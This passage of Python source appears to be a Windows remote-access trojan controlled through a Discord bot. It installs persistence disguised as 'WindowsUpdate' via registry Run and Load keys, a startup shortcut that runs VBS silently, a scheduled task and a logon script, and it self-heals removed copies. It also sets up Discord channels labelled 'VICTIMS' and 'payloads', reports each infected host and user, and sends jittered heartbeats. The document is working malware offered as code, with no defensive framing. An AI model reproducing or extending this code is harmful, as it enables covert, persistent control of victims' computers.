        # Remove VBS + PS1
        for path in (self._dropper_vbs_path(), self._dropper_ps1_path()):
            try:
                if os.path.exists(path):
                    os.remove(path)
                    results.append(f"Removed dropper file: {path}")
            except Exception as e:
                results.append(f"Dropper file removal failed ({path}): {e}")
        return results

    # ------------------------------------------------------------------

    def setup_registry_run_key(self, exe_path):
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, exe_path)
            winreg.CloseKey(key)
            return True, "Registry Run key set."
        except Exception as e:
            return False, f"Registry Run key failed: {e}"

    def cleanup_registry_run_key(self):
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(key, "WindowsUpdate")
            winreg.CloseKey(key)
            return True, "Registry Run key removed."
        except Exception as e:
            return False, f"Registry Run key cleanup failed: {e}"

    def setup_startup_shortcut(self, exe_or_vbs_path):
        try:
            import os
            startup_dir = os.path.join(os.environ["APPDATA"], r"Microsoft\Windows\Start Menu\Programs\Startup")
            shortcut_path = os.path.join(startup_dir, "WindowsUpdate.lnk")
            from win32com.client import Dispatch
            shell = Dispatch('WScript.Shell')
            shortcut = shell.CreateShortCut(shortcut_path)
            if exe_or_vbs_path.lower().endswith('.vbs'):
                # Launch VBS silently via wscript — survives deletion of any single EXE copy
                shortcut.Targetpath = r"C:\Windows\System32\wscript.exe"
                shortcut.Arguments = f'/B "{exe_or_vbs_path}"'
                shortcut.WorkingDirectory = os.path.dirname(exe_or_vbs_path)
            else:
                shortcut.Targetpath = exe_or_vbs_path
                shortcut.WorkingDirectory = os.path.dirname(exe_or_vbs_path)
            shortcut.save()
            return True, "Startup shortcut created."
        except Exception as e:
            return False, f"Startup shortcut failed: {e}"

    def cleanup_startup_shortcut(self):
        try:
            import os
            startup_dir = os.path.join(os.environ["APPDATA"], r"Microsoft\Windows\Start Menu\Programs\Startup")
            shortcut_path = os.path.join(startup_dir, "WindowsUpdate.lnk")
            if os.path.exists(shortcut_path):
                os.remove(shortcut_path)
            return True, "Startup shortcut removed."
        except Exception as e:
            return False, f"Startup shortcut cleanup failed: {e}"

    def setup_schtask(self, trigger_cmd):
        import subprocess
        try:
            task_name = "WindowsUpdate"
            # Pass trigger_cmd verbatim — no extra quoting needed with subprocess list form
            cmd = ["schtasks", "/Create", "/SC", "ONLOGON", "/TN", task_name, "/TR", trigger_cmd, "/F"]
            result = subprocess.run(cmd, capture_output=True)
            if result.returncode == 0:
                return True, "Scheduled task created."
            else:
                return False, f"Scheduled task failed: {result.stderr.decode('utf-8', errors='replace')}"
        except Exception as e:
            return False, f"Scheduled task failed: {e}"

    def cleanup_schtask(self):
        import subprocess
        try:
            task_name = "WindowsUpdate"
            cmd = ["schtasks", "/Delete", "/TN", task_name, "/F"]
            result = subprocess.run(cmd, capture_output=True)
            if result.returncode == 0:
                return True, "Scheduled task removed."
            else:
                return False, f"Scheduled task cleanup failed: {result.stderr.decode('utf-8', errors='replace')}"
        except Exception as e:
            return False, f"Scheduled task cleanup failed: {e}"

    def setup_registry_load_key(self, exe_path):
        r"""HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows 'Load' — runs via userinit at logon."""
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows NT\CurrentVersion\Windows",
                0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "Load", 0, winreg.REG_SZ, exe_path)
            winreg.CloseKey(key)
            return True, "Registry Load key set."
        except Exception as e:
            return False, f"Registry Load key failed: {e}"

    def cleanup_registry_load_key(self):
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows NT\CurrentVersion\Windows",
                0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(key, "Load")
            winreg.CloseKey(key)
            return True, "Registry Load key removed."
        except Exception as e:
            return False, f"Registry Load key cleanup failed: {e}"

    def setup_userinit_logon_script(self, exe_path):
        r"""HKCU\Environment 'UserInitMprLogonScript' — executed by netlogon at every interactive logon."""
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Environment",
                0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "UserInitMprLogonScript", 0, winreg.REG_SZ, exe_path)
            winreg.CloseKey(key)
            return True, "UserInitMprLogonScript set."
        except Exception as e:
            return False, f"UserInitMprLogonScript failed: {e}"

    def cleanup_userinit_logon_script(self):
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Environment",
                0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(key, "UserInitMprLogonScript")
            winreg.CloseKey(key)
            return True, "UserInitMprLogonScript removed."
        except Exception as e:
            return False, f"UserInitMprLogonScript cleanup failed: {e}"

    async def on_member_join(self, member):
        if member.id == self.user.id:
            return
        guild = member.guild
        agent_role = discord.utils.get(guild.roles, name="Agent")
        if agent_role and agent_role not in member.roles:
            await member.add_roles(agent_role, reason="Auto-assign Agent role to new victim/agent")

    async def on_ready(self):
        guild = self.guilds[0]
        agent_role = discord.utils.get(guild.roles, name="Agent")
        if not agent_role:
            agent_role = await guild.create_role(name="Agent", colour=discord.Colour.dark_grey(), mentionable=True, reason="Ensure Agent role exists")
        if agent_role not in guild.me.roles:
            await guild.me.add_roles(agent_role, reason="Assign Agent role to self")

        async def get_or_create_category(name):
            cat = discord.utils.get(guild.categories, name=name)
            if not cat:
                overwrites = {
                    guild.default_role: discord.PermissionOverwrite(read_messages=False),
                    guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True)
                }
                cat = await guild.create_category(name, overwrites=overwrites)
            return cat

        operations_cat = await get_or_create_category("C2 OPERATIONS")
        logs_cat = await get_or_create_category("LOGS & AUDIT")
        victims_cat = await get_or_create_category("VICTIMS")
        control_cat = await get_or_create_category("CONTROL")
        self.category = victims_cat

        async def get_or_create_channel(cat, name):
            ch = discord.utils.get(cat.channels, name=name)
            if not ch:
                overwrites = {
                    guild.default_role: discord.PermissionOverwrite(read_messages=False),
                    guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True)
                }
                ch = await guild.create_text_channel(name, category=cat, overwrites=overwrites)
            return ch

        self.briefings_channel = await get_or_create_channel(operations_cat, "briefings")
        self.sitreps_channel = await get_or_create_channel(operations_cat, "sitreps")
        self.global_logs_channel = await get_or_create_channel(logs_cat, "global-logs")
        self.payload_channel = await get_or_create_channel(control_cat, "payloads")
        self.intel_channel = await get_or_create_channel(control_cat, "intel-feed")
        self.reports_channel = await get_or_create_channel(logs_cat, "reports")
        self.announcements_channel = self.sitreps_channel

        # Ensure art-log exists or fallback to global-log
        try:
            self.art_log_channel = await get_or_create_channel(logs_cat, "art-log")
        except Exception:
            self.art_log_channel = None

        channel_name = f"cmd-{self.hostname.lower().replace(' ','-')}-{self.unique_id[:6]}"
        for ch in victims_cat.channels:
            if ch.name == channel_name:
                self.channel = ch
                break
        else:
            overwrites = {
                guild.default_role: discord.PermissionOverwrite(read_messages=False),
                guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True)
            }
            owner = guild.owner
            if owner:
                overwrites[owner] = discord.PermissionOverwrite(read_messages=True, send_messages=True)
            self.channel = await guild.create_text_channel(channel_name, category=victims_cat, overwrites=overwrites)

        current_user = get_current_user()
        await self.briefings_channel.send(f"🟢 **C2 Agent Online**\nHost: `{self.hostname}`\nUser: `{current_user}`\nID: `{self.unique_id}`")
        await self.channel.send(f"🟢 **C2 Agent Online**\nHost: `{self.hostname}`\nUser: `{current_user}`\nID: `{self.unique_id}`")

        if not self.heartbeat_task:
            self.heartbeat_task = asyncio.create_task(self.heartbeat_loop())

        # Silently re-copy missing EXE copies and re-register any broken triggers
        asyncio.create_task(asyncio.to_thread(self._self_heal_persistence))

    async def heartbeat_loop(self):
        while True:
            jitter = random.randint(180, 330)
            await asyncio.sleep(jitter)
            self.last_heartbeat = time.time()
            await self.channel.edit(name=self.channel.name.replace("[OFFLINE]", ""))
            msg = f"💓 Heartbeat: `{self.hostname}` alive at {time.strftime('%Y-%m-%d %H:%M:%S')}"
            await self.sitreps_channel.send(msg)

def run_discord_thread():
    if not acquire_single_instance_guard():
        return
    
    def wait_for_network():
        """Wait until network is actually available by testing Discord connectivity."""
        import socket
        max_wait = 300
        waited = 0
        while waited < max_wait:
            try:
                socket.create_connection(("discord.com", 443), timeout=5)
                return True
            except (socket.error, socket.timeout):
                time.sleep(10)
                waited += 10
        return False
    
    wait_for_network()
    
    configure_windows_event_loop_policy()
    intents = discord.Intents.default()
    intents.message_content = True
    client = DiscordC2(intents=intents)
    
    while True:
        try:
            client.run(BOT_TOKEN)
            break
        except Exception:
            time.sleep(30)
            wait_for_network()
            client = DiscordC2(intents=intents)

if __name__ == "__main__":
    run_discord_thread()